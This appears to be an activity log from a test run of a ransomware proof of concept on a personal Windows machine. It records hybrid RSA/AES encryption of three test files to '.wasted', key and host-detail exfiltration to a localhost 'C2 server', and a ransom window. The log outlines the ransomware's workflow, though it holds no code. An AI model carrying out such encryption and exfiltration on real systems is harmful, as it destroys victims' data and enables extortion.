2025-06-25 11:16:24,158 - INFO - ============================================================
2025-06-25 11:16:24,158 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 11:16:24,159 - INFO - ============================================================
2025-06-25 11:16:24,160 - INFO - Log file: logs/ransomware_activity_20250625_111624.log
2025-06-25 11:16:24,160 - INFO - Timestamp: 2025-06-25 11:16:24
2025-06-25 11:16:24,299 - INFO - Platform: Windows 11
2025-06-25 11:16:24,299 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 11:16:24,299 - INFO - User: mudit
2025-06-25 11:16:24,300 - INFO - Hostname: Mudityadev
2025-06-25 11:16:24,301 - INFO - ============================================================
2025-06-25 11:16:24,301 - INFO - Starting main function
2025-06-25 11:16:24,301 - INFO - Parsing command line arguments
2025-06-25 11:16:24,302 - INFO - Setting up argument parser
2025-06-25 11:16:24,304 - INFO - Parsing command line arguments
2025-06-25 11:16:24,304 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 11:16:24,305 - INFO - Operation mode: ENCRYPT
2025-06-25 11:16:24,305 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:16:24,305 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:16:24,306 - INFO - Initializing RSA encryption for AES key
2025-06-25 11:16:24,381 - INFO - AES key encrypted with RSA public key
2025-06-25 11:16:24,382 - INFO - Encrypted key (base64): asn0WuUJSRPo1JNsvizv7JWvC5mClx9Ge60nFsbRBopd1poqpG7kBHFBcKUqESQ3m8idxpN67D0HTlfVU2OcKfbW93dwUq1kSxwIKAKabGq/+xSXNQ8Ovza2LptKqcgd0p9gzbjNRoSZKvtD0mx5Fa4toiVUhjEFctsOkhqGaPKfIQf1FF49VAgh1hVGODnftpTcwpwI4TvqZvU0hK7XhTteEosCc2lnw8GjyShX/Hd6L2XJ9E+0U62uRXJiVQ/fO78PYL+++HUt2ndzUC4aehUVOBvuLftBE77RhMuLA9gQIx+eJwRm0A9GwcAqTrimiuhGGVIg6h71lScu8KPNCA==
2025-06-25 11:16:24,382 - INFO - Using hardcoded AES key for encryption
2025-06-25 11:16:24,382 - INFO - Creating AES cipher with CTR mode
2025-06-25 11:16:24,392 - INFO - Starting file discovery and processing
2025-06-25 11:16:24,393 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:16:24,395 - INFO - Discovered 3 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:16:24,396 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt
2025-06-25 11:16:24,400 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt -> D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt.wasted
2025-06-25 11:16:24,400 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt
2025-06-25 11:16:24,402 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt -> D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt.wasted
2025-06-25 11:16:24,403 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt
2025-06-25 11:16:24,405 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt -> D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt.wasted
2025-06-25 11:16:24,405 - INFO - Total files processed: 3
2025-06-25 11:16:24,406 - INFO - Starting key exfiltration and GUI launch
2025-06-25 11:16:24,406 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 11:16:24,433 - INFO - Retrieving local IP address
2025-06-25 11:16:24,435 - INFO - Local IP address: 192.168.217.136
2025-06-25 11:16:24,436 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 11:16:24,437 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev
2025-06-25 11:16:24,437 - INFO - Launching GUI window
2025-06-25 11:16:43,123 - INFO - GUI window closed
2025-06-25 11:16:43,124 - INFO - Wiping encryption key from memory
2025-06-25 11:16:43,124 - INFO - Key wipe completed
2025-06-25 11:16:43,125 - INFO - ============================================================
2025-06-25 11:16:43,125 - INFO - RANSOMWARE PoC ACTIVITY LOG ENDED
2025-06-25 11:16:43,125 - INFO - ============================================================
